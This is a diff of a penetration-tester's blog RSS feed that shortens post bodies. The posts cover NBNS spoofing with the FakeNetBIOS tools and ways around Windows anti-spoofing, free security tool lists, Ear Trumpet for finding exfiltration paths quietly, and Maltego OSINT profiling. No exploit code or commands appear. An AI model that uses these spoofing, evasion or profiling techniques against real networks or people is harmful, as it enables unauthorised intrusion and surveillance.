-&lt;p&gt;and in that post the Metasploit module to do it all is demoed. But there in lies the rub. With each degree of separation we have more and more solidified in into a &amp;ldquo;on-site&amp;rdquo; only attack. But if you read through Sid&amp;rsquo;s paper from 2007 this doesn&amp;rsquo;t have to be the case. He uses a tool written by &amp;ldquo;Patrick Chambet&amp;rdquo; back in 2005 for the Honeynet project: &lt;a href=&#34;http://seclists.org/honeypots/2005/q4/46&#34;&gt;http://seclists.org/honeypots/2005/q4/46&lt;/a&gt; called &amp;ldquo;FakeNetbiosDGM and FakeNetbiosNS&amp;rdquo;.&lt;/p&gt;
-
-&lt;p&gt;Finding the tools was no easy task though, googling for the file name, the author or the project just netted me this link:&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;http://honeynet.rstack.org/tools/FakeNetBIOS-0.91.zip&#34;&gt;http://honeynet.rstack.org/tools/FakeNetBIOS-0.91.zip&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Gotta love the Wayback Machine, I finally found it here: &lt;a href=&#34;http://wayback.archive.org/web/*/http://honeynet.rstack.org/tools/FakeNetBIOS-0.91.zip&#34;&gt;http://wayback.archive.org/web/*/http://honeynet.rstack.org/tools/FakeNetBIOS-0.91.zip&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;and eventually also here (on the author&amp;rsquo;s site of all places): &lt;a href=&#34;http://www.chambet.com/tools.html&#34;&gt;http://www.chambet.com/tools.html&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Question is, does it still work?? 2nd Question, how well does it work through/with Meterpreter?&lt;/p&gt;
-
-&lt;p&gt;(As a side note, I haven&amp;rsquo;t tried, but you might be able to use Py2Exe or PyInstaller to run nbnspoof.py on a windows box)&lt;/p&gt;
-
-&lt;p&gt;When running it on XP SP3 I get the following&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://room362.com/images/postimages/201209_fakenetbios_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Booooooooo, and on Windows 7 I get this:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://room362.com/images/postimages/201209_fakenetbios_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ok, error 10013 is a permissions issue, I can deal with that..&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://room362.com/images/postimages/201209_fakenetbios_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Run as Administrator it works! But something is wrong with the communication because the host doing the lookup doesn&amp;rsquo;t get the correct resolution back.&lt;/p&gt;
-
-&lt;p&gt;From what I can google it looks as though Windows Firewall has an &amp;lsquo;Anti-Spoofing&amp;rsquo; outbound filter, so these &amp;ldquo;Bytes sent&amp;rdquo; don&amp;rsquo;t even make it to Wireshark.&lt;/p&gt;
-
-&lt;p&gt;I have created a Github repository, stuck the contents of the zip file in it and this is where I ask for help. If you know 1) how to disable the Windows Anti-spoofing filter or 2) How to circumvent it please leave a comment here, and issue on the repo or email me directly.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;UPDATE (1&amp;amp;2 solved for this use case)&lt;/strong&gt;: &lt;a href=&#34;https://room362.com/blog/2012/09/02/old-school-on-target-nbns-spoofing-part-2/&#34;&gt;/blog/2012/09/02/old-school-on-target-nbns-spoofing-part-2/&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;The other thing is, if you want to improve the code, that would be awesome too, submit a pull request, I&amp;rsquo;d love to get this thing going again and make it into something that we can solidly use over a Meterpreter session.&lt;/p&gt;
-
-&lt;p&gt;Github repo: &lt;a href=&#34;https://github.com/mubix/FakeNetBIOS&#34;&gt;https://github.com/mubix/FakeNetBIOS&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;And if the only commit to this repo 5 years from now is &amp;ldquo;Initial commit&amp;rdquo; then at the very least it will be some where the next blogger who picks up the trail can get it from.&lt;/p&gt;
-
-&lt;p&gt;P.S. If you know how to solve the issue on XP, that would be an awesome fix as well.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;UPDATE 2: Looks like the XP issue ahas the Anti-spoofing too. (i.e it works great if you use the IP of the actual IP of the box with different hostnames)&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;I guess the only improvement I&amp;rsquo;d look for is for an .* (ALL HOSTS) ability&lt;/strong&gt;&lt;/p&gt;
-</description>
+      <description>One of pen testers favorite attacks is NBNS spoofing. Now Wesley who I originally learned this attack from, traced this back to sid (http://www.notsosecure.com/folder2/2007/03/14/abusing-tcpip-name-resolution-in-windows-to-carry-out-phishing-attacks/) . Wesley&amp;rsquo;s stuff can be found here: http://www.mcgrewsecurity.com/tools/nbnspoof/
+Wesley&amp;rsquo;s stuff eventually lead to this awesome post on the Packetstan blog: http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html
+and in that post the Metasploit module to do it all is demoed. But there in lies the rub. With each degree of separation we have more and more solidified in into a &amp;ldquo;on-site&amp;rdquo; only attack.</description>
     </item>
     
     <item>
@@ -463,47 +104,8 @@ PROJECTMENTOR FILESHARE 173.26.10.207
       <pubDate>Wed, 20 Jun 2012 18:34:57 +0000</pubDate>
       
       <guid>https://room362.com/post/2012/2012-06-20-companies-that-give-back-with-free-tools/</guid>
-      <description>&lt;p&gt;Penetration Testing / Red Teaming requires the use of a lot of tools. I don&amp;rsquo;t mind getting called a &amp;ldquo;script kiddie&amp;rdquo; because I can accomplish more and faster when I don&amp;rsquo;t have to code every single task I need to do. This post is to point out companies that make this possible and give a small bit of thanks.&lt;/p&gt;
-
-&lt;p&gt;(If you&amp;rsquo;ve ever tried to convince a company to give something away for free, you can understand how big this really is) Some give a lot, some only one tool, but even one is more than some.&lt;/p&gt;
-
-&lt;p&gt;Of course the first is going to be Rapid7 and the &lt;strong&gt;Metasploit&lt;/strong&gt; team:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;https://github.com/rapid7/metasploit-framework&#34;&gt;https://github.com/rapid7/metasploit-framework&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Other company&amp;rsquo;s free tools sections:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;Sunera&lt;/strong&gt;: &lt;a href=&#34;http://security.sunera.com/p/tools.html&#34;&gt;http://security.sunera.com/p/tools.html&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Immunity Inc&lt;/strong&gt;: &lt;a href=&#34;http://immunityinc.com/resources-freesoftware.shtml&#34;&gt;http://immunityinc.com/resources-freesoftware.shtml&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;SecureState&lt;/strong&gt;: &lt;a href=&#34;http://www.securestate.com/Research%20and%20Innovation/Pages/Tools.aspx&#34;&gt;http://www.securestate.com/Research%20and%20Innovation/Pages/Tools.aspx&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Core Security&lt;/strong&gt;: &lt;a href=&#34;http://corelabs.coresecurity.com/index.php?module=Wiki&amp;amp;action=list&amp;amp;type=tool&#34;&gt;http://corelabs.coresecurity.com/index.php?module=Wiki&amp;amp;action=list&amp;amp;type=tool&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Hex-Rays&lt;/strong&gt;: &lt;a href=&#34;http://www.hex-rays.com/products/ida/support/download_freeware.shtml&#34;&gt;http://www.hex-rays.com/products/ida/support/download_freeware.shtml&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Spider Labs&lt;/strong&gt;: &lt;a href=&#34;https://www.trustwave.com/spiderLabs-tools.php&#34;&gt;https://www.trustwave.com/spiderLabs-tools.php&lt;/a&gt; and &lt;a href=&#34;https://github.com/SpiderLabs&#34;&gt;https://github.com/SpiderLabs&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;RandomStorm&lt;/strong&gt;: &lt;a href=&#34;http://www.randomstorm.com/free-security-tools.php&#34;&gt;http://www.randomstorm.com/free-security-tools.php&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;SensePost&lt;/strong&gt;: &lt;a href=&#34;http://www.sensepost.com/labs/tools/pentest&#34;&gt;http://www.sensepost.com/labs/tools/pentest&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Mc^H^H Foundstone&lt;/strong&gt;: &lt;a href=&#34;http://www.mcafee.com/us/downloads/free-tools/index.aspx&#34;&gt;http://www.mcafee.com/us/downloads/free-tools/index.aspx&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Stach and Liu&lt;/strong&gt;: &lt;a href=&#34;http://www.stachliu.com/resources/tools/&#34;&gt;http://www.stachliu.com/resources/tools/&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Secure Ideas&lt;/strong&gt;: &lt;a href=&#34;http://www.secureideas.net/publications.php&#34;&gt;http://www.secureideas.net/publications.php&lt;/a&gt; (Projects on the right)&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Buguroo&lt;/strong&gt;: &lt;a href=&#34;http://blog.buguroo.com/?cat=6&#34;&gt;http://blog.buguroo.com/?cat=6&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;IOActive&lt;/strong&gt;: &lt;a href=&#34;http://ioactive.com/ioactive_labs_tools.html&#34;&gt;http://ioactive.com/ioactive_labs_tools.html&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;InGuardians&lt;/strong&gt;: &lt;a href=&#34;http://www.inguardians.com/tools/&#34;&gt;http://www.inguardians.com/tools/&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Aspect Security&lt;/strong&gt;: &lt;a href=&#34;https://www.aspectsecurity.com/research/appsec_tools/&#34;&gt;https://www.aspectsecurity.com/research/appsec_tools/&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;HP&lt;/strong&gt;: &lt;a href=&#34;http://bit.ly/SWFScan_New&#34;&gt;http://bit.ly/SWFScan_New&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;NirSoft&lt;/strong&gt;: &lt;a href=&#34;http://www.nirsoft.net/&#34;&gt;http://www.nirsoft.net/&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Joeware&lt;/strong&gt;: &lt;a href=&#34;http://www.joeware.net/freetools/&#34;&gt;http://www.joeware.net/freetools/&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;and of course Micros^H^H^H^H^H^H Sys Internals:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;http://technet.microsoft.com/en-us/sysinternals/bb842062.aspx&#34;&gt;http://technet.microsoft.com/en-us/sysinternals/bb842062.aspx&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;If you know of more, please leave a comment below and I&amp;rsquo;ll add it to the list.&lt;/p&gt;
-</description>
+      <description>Penetration Testing / Red Teaming requires the use of a lot of tools. I don&amp;rsquo;t mind getting called a &amp;ldquo;script kiddie&amp;rdquo; because I can accomplish more and faster when I don&amp;rsquo;t have to code every single task I need to do. This post is to point out companies that make this possible and give a small bit of thanks.
+(If you&amp;rsquo;ve ever tried to convince a company to give something away for free, you can understand how big this really is) Some give a lot, some only one tool, but even one is more than some.</description>
     </item>
     
     <item>
@@ -512,16 +114,10 @@ PROJECTMENTOR FILESHARE 173.26.10.207
       <pubDate>Thu, 12 Feb 2009 15:58:59 +0000</pubDate>
       
       <guid>https://room362.com/post/2009/2009-02-12-shmoocon-tools/</guid>
-      <description>&lt;p&gt;It figures that someone who didn’t go actually made a list of tools. (Probably because they didn’t have to suffer the ShmooFlu)&lt;/p&gt;
-
-&lt;p&gt;Check out: &lt;a href=&#34;http://blog.security4all.be/2009/02/shmoocon-2009-overview-collection-of.html&#34;&gt;http://blog.security4all.be/2009/02/shmoocon-2009-overview-collection-of.html&lt;/a&gt; &lt;/p&gt;
-
-&lt;p&gt;Thanks to &lt;a href=&#34;http://twitter.com/security4all&#34;&gt;Security4all&lt;/a&gt; for posting it up!&lt;/p&gt;
-
-&lt;p&gt;If you see something that he doesn’t have, pictures, videos, links, or tools, please let him know.&lt;/p&gt;
-
-&lt;p&gt;FireTalks / PodCasters Meetup audio can be found here soon: &lt;a href=&#34;http://pcm.libsyn.com/&#34;&gt;http://pcm.libsyn.com/&lt;/a&gt;&lt;/p&gt;
-</description>
+      <description>It figures that someone who didn’t go actually made a list of tools. (Probably because they didn’t have to suffer the ShmooFlu)
+Check out: http://blog.security4all.be/2009/02/shmoocon-2009-overview-collection-of.html Thanks to Security4all for posting it up!
+If you see something that he doesn’t have, pictures, videos, links, or tools, please let him know.
+FireTalks / PodCasters Meetup audio can be found here soon: http://pcm.libsyn.com/</description>
     </item>
     
     <item>
@@ -530,12 +126,9 @@ PROJECTMENTOR FILESHARE 173.26.10.207
       <pubDate>Sat, 07 Feb 2009 20:22:02 +0000</pubDate>
       
       <guid>https://room362.com/post/2009/2009-02-07-the-middler-gets-released-at-shmoocon/</guid>
-      <description>&lt;p&gt;The official link is up and here it is.. well, until they release the beta:&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;http://inguardians.com/tools/middler-alpha.tgz&#34;&gt;http://inguardians.com/tools/middler-alpha.tgz&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt; Keep up with &lt;a href=&#34;http://www.inguardians.com/&#34;&gt;http://www.inguardians.com/&lt;/a&gt; for all of their great tools.&lt;/p&gt;
-</description>
+      <description>The official link is up and here it is.. well, until they release the beta:
+http://inguardians.com/tools/middler-alpha.tgz
+ Keep up with http://www.inguardians.com/ for all of their great tools.</description>
     </item>
     
     <item>
@@ -544,20 +137,7 @@ PROJECTMENTOR FILESHARE 173.26.10.207
       <pubDate>Tue, 03 Feb 2009 18:35:00 +0000</pubDate>
       
       <guid>https://room362.com/post/2009/2009-02-03-ear-trumpet/</guid>
-      <description>&lt;p&gt;I have had the idea for this app for a long time, expressed it a few times, but never really pushed, and I sure that I am not the only one who has thought of or wanted an app like &lt;a href=&#34;http://www.digininja.org/ear_trumpet.php&#34;&gt;Ear Trumpet&lt;/a&gt; by &lt;a href=&#34;http://www.digininja.org/&#34;&gt;Robin Wood&lt;/a&gt;. Well on Jan 21st Sam Buhlig posted to the &lt;a href=&#34;http://mail.pauldotcom.com/cgi-bin/mailman/listinfo/pauldotcom&#34;&gt;PaulDotCom mailing list &lt;/a&gt; asking for an app to test a firewall that would answer on all ports. A great discussion spawned off and a couple guys (Dimitrios Kapsalis, and Robin Wood) started work on it.&lt;/p&gt;
-
-&lt;p&gt;So what is Ear Trumpet? It’s a server/client app just like Cain and Abel is. But each piece has one very simple task: ear listens on a server on all TCP port, and trumpet tries to get to it on all TCP ports. That’s it.&lt;/p&gt;
-
-&lt;p&gt;What does that do for me? Well, here are two instances where it could be useful:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;p&gt;As a Firewall / Perimeter Technician, where you use it to test to see if all of your firewall rules are working properly so that no one can get through. (Outside in. Ear internal, Trumpet external)&lt;/p&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;As a Penetration Tester, where you use it to find exfiltration points, ways out of the network. (Inside out, Ear external, Trumpet internal), You could even put Trumpet on multiple computers in this instance and see which systems have different access out. There are sleep methods plugged into Trumpet to allow you to stay under the radar.&lt;/p&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;What can you use it for? Simple programs like this always have a million uses. Comment with your idea.&lt;/p&gt;
-</description>
+      <description>I have had the idea for this app for a long time, expressed it a few times, but never really pushed, and I sure that I am not the only one who has thought of or wanted an app like Ear Trumpet by Robin Wood. Well on Jan 21st Sam Buhlig posted to the PaulDotCom mailing list  asking for an app to test a firewall that would answer on all ports.</description>
     </item>
     
     <item>
@@ -566,39 +146,7 @@ PROJECTMENTOR FILESHARE 173.26.10.207
       <pubDate>Tue, 13 Jan 2009 18:23:08 +0000</pubDate>
       
       <guid>https://room362.com/post/2009/2009-01-13-maltego-2-and-beyond-part-3/</guid>
-      <description>
-
-&lt;h2 id=&#34;table-of-contents&#34;&gt;Table of Contents:&lt;/h2&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;https://room362.com/blog/2009/09/08/maltego-2-and-beyond-part-1&#34;&gt;Part 1 - Introduction&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://room362.com/blog/2008/09/26/maltego-2-and-beyond-part-2/&#34;&gt;Part 2 - Entities and Transforms&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;Part 3 - The Human Factor&lt;/li&gt;
-&lt;li&gt;Part 4 - Server Time (CTAS, PTTAS, MALTAS, SQLTAS, SNTAS)&lt;/li&gt;
-&lt;li&gt;Part 5 - Hacks, Tips, and Tricks
-&lt;br /&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Today we are taking a brief step outside of Maltego and at the end we’ll show how you can use what you have learned to take Maltego to another level. So, without further ado:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://room362.com/images/postimages/200901_maltego_1.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;The Human Factor is why we all still have jobs in the security world. It is impossible for machines at this day in age to make logical leaps of faith. Yes, there is fuzzy logic, but the human brain still trumps computers on being able to instinctively make those leaps. Instinct, that word describes the whole reason for this part in the series. Just as a PI uses he gut to lead him on the right trail, as an OSINT (Open Source Intelligence) Specialist you have to use your instincts to guide your investigation as well. The following paragraphs will describe my own method of making those leaps. If you disagree or have better methods, please comment below so that others can learn as well.&lt;/p&gt;
-
-&lt;p&gt;What is a logical leap of faith? Well, most pentesters do it daily if not hourly, when they assume a cracked password is going to work in other places. It’s all about betting on standards. Standards in this reference is anything that has become common place, not specifically a written rule, but those are good to. Dan Geer ‘left’ @Stake when he and other thought leaders in the security community published a paper back in 2003:&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Cyber _In_Security: The Cost of Monopoly&lt;/strong&gt; [&lt;a href=&#34;http://www.ccianet.org/papers/cyberinsecurity.pdf&#34;&gt;PDF&lt;/a&gt;]&lt;/p&gt;
-
-&lt;p&gt;Archived Link: &lt;a href=&#34;http://pdf.textfiles.com/academics/cyberinsecurity.pdf&#34;&gt;http://pdf.textfiles.com/academics/cyberinsecurity.pdf&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://room362.com/images/postimages/200901_maltego_2.png&#34; alt=&#34;Dan Geer&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;I was originally planning on making this article full of examples on how you can make these leaps, but I have had a lot of time to think these examples and have decided against it. To practice this method you must use your own experiences. Where do people do the same thing? Think about it. I’m sure you can come up this at least a dozen examples where even you do the same thing across the board&amp;hellip; Ok, so I can’t resist. Using the same password, or username on different sites. Seeing a User Agent that is concatenated by a proxy. The router being .1 or .2. Using full class C networks. Always adding the same core friends or co-workers to every social networking site. What about referencing the same ‘ficticous’ bank when describing a problem with that bank. What examples have you come up with?&lt;/p&gt;
-
-&lt;p&gt;How do you pull this out-of-the-box thinking into Maltego? When entering an email for an entity, try putting it in under different domains (yahoo.com, aol.com, gmail.com, google.com, hotmail.com). When entering a domain, try putting it in under different TLDs (.net, .org, .tv). You might be surprised at the gems you find when you find those forgotten pieces of information. This all falls back on my mantra that you should put in ALL of the information you have (and estimated) before you even start running transforms.&lt;/p&gt;
-
-&lt;p&gt;Maltego is a tool that can only take you so far. Your creativity is what makes a tool like this powerful.&lt;/p&gt;
-</description>
+      <description>Table of Contents:  Part 1 - Introduction Part 2 - Entities and Transforms Part 3 - The Human Factor Part 4 - Server Time (CTAS, PTTAS, MALTAS, SQLTAS, SNTAS) Part 5 - Hacks, Tips, and Tricks   Today we are taking a brief step outside of Maltego and at the end we’ll show how you can use what you have learned to take Maltego to another level. So, without further ado:</description>
     </item>
     
     <item>
@@ -607,12 +155,9 @@ PROJECTMENTOR FILESHARE 173.26.10.207
       <pubDate>Sat, 06 Dec 2008 02:03:00 +0000</pubDate>
       
       <guid>https://room362.com/post/2008/2008-12-06-maltego-201-released/</guid>
-      <description>&lt;p&gt;This is just a quick blurb because &lt;a href=&#34;http://spylogic.net&#34;&gt;Tom&lt;/a&gt; from the &lt;a href=&#34;http://securityjustice.com/&#34;&gt;Security Justice Podcast&lt;/a&gt; already has a great post about all the changes:&lt;/p&gt;
-
-&lt;p&gt;Check out his post here: &lt;a href=&#34;http://spylogic.net/item/382&#34;&gt;http://spylogic.net/item/382&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;New link: &lt;a href=&#34;http://www.spylogic.net/2008/12/maltego-201-released/&#34;&gt;http://www.spylogic.net/2008/12/maltego-201-released/&lt;/a&gt;&lt;/p&gt;
-</description>
+      <description>This is just a quick blurb because Tom from the Security Justice Podcast already has a great post about all the changes:
+Check out his post here: http://spylogic.net/item/382
+New link: http://www.spylogic.net/2008/12/maltego-201-released/</description>
     </item>
     
     <item>
@@ -621,86 +166,7 @@ PROJECTMENTOR FILESHARE 173.26.10.207
       <pubDate>Fri, 26 Sep 2008 14:10:32 +0000</pubDate>
       
       <guid>https://room362.com/post/2008/2008-09-26-maltego-2-and-beyond-part-2/</guid>
-      <description>
-
-&lt;p&gt;Now that you have had some time to play around with &lt;a href=&#34;http://www.paterva.com/maltego/community-edition/&#34;&gt;Community Edition&lt;/a&gt; or if you were lucky (or rich) enough, the &lt;a href=&#34;http://www.paterva.com/maltego/download/&#34;&gt;Full version&lt;/a&gt;. We are going to start delving into the the pieces of &lt;a href=&#34;http://www.paterva.com/maltego/&#34;&gt;Maltego&lt;/a&gt; and then in Part 5 we rip it apart and put it back together for &lt;a href=&#34;http://www.paterva.com/maltego/pt-tas/&#34;&gt;PT-TAS&lt;/a&gt; (Penetration Testing - Transform Application Server). I am going to say “investigation” a lot in the coming paragraphs and parts of this article. what I mean when I use this word is everything from ego and tin-hat searches to the military grade or counterintelligence level searches. As stated before, &lt;a href=&#34;http://www.paterva.com/maltego/&#34;&gt;Maltego&lt;/a&gt; &lt;a href=&#34;http://www.paterva.com/maltego/community-edition/&#34;&gt;Community Edition&lt;/a&gt; is free. Use it however and for whatever you want. If you think of a new and interesting way of using Maltego please send me an email and I will make it part of this series, or post it in the &lt;a href=&#34;http://www.paterva.com/forum/&#34;&gt;Maltego Forums&lt;/a&gt;. &lt;a href=&#34;http://www.paterva.com/&#34;&gt;Paterva&lt;/a&gt; is always interested in hearing from the community, especially feature requests.&lt;/p&gt;
-
-&lt;p&gt;First lets outline whats to come:&lt;/p&gt;
-
-&lt;h2 id=&#34;table-of-contents&#34;&gt;Table of Contents:&lt;/h2&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;https://room362.com/blog/2009/09/08/maltego-2-and-beyond-part-1&#34;&gt;Part 1 - Introduction&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;Part 2 - Entities and Transforms&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://room362.com/blog/2009/01/13/maltego-2-and-beyond-part-3/&#34;&gt;Part 3 - The Human Factor&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;Part 4 - Server Time (CTAS, PTTAS, MALTAS, SQLTAS, SNTAS)&lt;/li&gt;
-&lt;li&gt;Part 5 - Hacks, Tips, and Tricks&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;The reason I am not going into the installation or registration of Maltego is because 1. It’s already installed on &lt;a href=&#34;http://www.remote-exploit.org/backtrack.html&#34;&gt;Back|Track&lt;/a&gt; and 2. Because Paterva already has a &lt;a href=&#34;http://ctas.paterva.com/view/Userguide&#34;&gt;great wiki article&lt;/a&gt; on the topic. So lets begin:&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;![](http://s3.media.squarespace.com/production/438411/4879756/uploads/entity.jpg)&lt;/code&gt;
-&lt;img src=&#34;https://room362.com/images/postimages/404.gif&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&#34;entities&#34;&gt;Entities&lt;/h2&gt;
-
-&lt;p&gt; (&lt;a href=&#34;http://ctas.paterva.com/view/Category:Entities&#34;&gt;wiki article on Entities&lt;/a&gt;)&lt;/p&gt;
-
-&lt;p&gt;Entities are the basic nuts and bolts of your investigation. Entities spawn other entities through the use of transforms. But, what is an entity? Well at the time of this publishing it can be one of the following&lt;/p&gt;
-
-&lt;h3 id=&#34;infrastructure-palette&#34;&gt;Infrastructure Palette:&lt;/h3&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;p&gt;&lt;strong&gt;AS (Autonomous System Number&lt;/strong&gt;): This is a number assigned to a network that allows BGP (Border Gateway Protocol) to know where it’s neighbors are. (&lt;a href=&#34;http://blog.wired.com/27bstroke6/2008/08/revealed-the-in.html&#34;&gt;And there aren’t any exploits for BGP right?&lt;/a&gt;)&lt;/p&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;&lt;strong&gt;DNS Name&lt;/strong&gt;: This is a human readable form of an IP. And, unlike my mother believes, a DNS name does NOT mean it’s a web site. For example hr2xp00209.contoso.com does not serve up a web site, well at least it shouldn’t. (&lt;a href=&#34;http://www.doxpara.com/DMK_BO2K8.ppt&#34;&gt;And there are no exploits for DNS right? -PPT LINK-&lt;/a&gt;)&lt;/p&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;&lt;strong&gt;Domain&lt;/strong&gt;: In the sense of a DNS domain. This can be localdomain.local contoso.com, or microshaft.com&lt;/p&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;&lt;strong&gt;IP Address&lt;/strong&gt;:  The 4 byte (or 16 byte with IPv6) set of numbers that computers understand better than DNS names&lt;/p&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;Netblock: A block of contiguous IP addresses that are “owned”&lt;/p&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;Website: (Myspace.com, DUH!)&lt;/p&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&#34;personal-palette&#34;&gt;Personal Palette:&lt;/h3&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;p&gt;Email Address:YourSuperCoolHackerHandle@h4x0rbl0gthatyouneverupdate.com (And then you sign that email address with your super secret family-only email address that you never use, with your PGP key)&lt;/p&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;Location:Area 51, Washington DC, The Moon&lt;/p&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;Person: A first and and last name (we will get into handles with “Phrase”, also, remember that PGP key you used, oh it has your full name on there)&lt;/p&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;Phone Number: This is a 7 digit or 10 digit number, returns a lot of false positives in my experiance, but has also pulled some great contact info for companies that weren’t available from their site. (i.e. someone posted their details in a group or forum asking for help)&lt;/p&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;The last entity is “Phrase”. I specifically isolated it because of its untapped power in Maltego. This is a Google hacker’s dream. This entity will send any Google hack (or regular search term/phrase) you have to a search engine (Out of the box it’s Yahoo) and then extracts as many of the above entities as it can. To couple the power of Google hacking with all of the information you have gathered, and if the old adage, “Knowledge is Power” is right. You now have at your disposal a nuclear arsenal worth of “power”. Add &lt;a href=&#34;http://www.paterva.com/maltego/pt-tas/&#34;&gt;PT-TAS&lt;/a&gt; (which we will talk about later) and you might as well have an Ion Cannon for your investigation.&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;http://s3.media.squarespace.com/production/438411/4879756/uploads/ion_cannon.serendipityThumb.jpg&lt;/code&gt;
-&lt;img src=&#34;https://room362.com/images/postimages/404.gif&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&#34;transforms&#34;&gt;Transforms&lt;/h2&gt;
-
-&lt;p&gt; (&lt;a href=&#34;http://ctas.paterva.com/view/Category:Transforms&#34;&gt;wiki article on Transforms&lt;/a&gt;)&lt;/p&gt;
-
-&lt;p&gt;There are more transforms than I have space for and you really don’t need me to insult your intelligence any more than I already have with my list of entities. So, I am picking out a few of my favorites that might get you a tad bit worried enough to go out and download Maltego, just to see if they pop on you.&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;p&gt;&lt;strong&gt;Email to PG&lt;/strong&gt;&lt;strong&gt;P&lt;/strong&gt;: It takes an email address and then checks to see what other email addresses you have signed with your key and what the name associated with those email addresses are, along with the email address you searched for. Makes you kind of think of what other security tools can be turned back on themselves.&lt;/p&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;&lt;strong&gt;IP or Netblock to Wiki Edits&lt;/strong&gt;: With this tool you can get a sense of what changes a company/person/organization makes to Wikipedia. I have had mixed results with how much information return this gets but, as you can see by this interesting graph. Three letter agencies like to make edits ;-)&lt;/p&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;&lt;strong&gt;Metadata Extration from Documents&lt;/strong&gt;: The transform is an information gold mine. It could give you insight into the names of users, the domain’s naming convention, possibly even the internal domain name and version of software made that document.&lt;/p&gt;&lt;/li&gt;
-
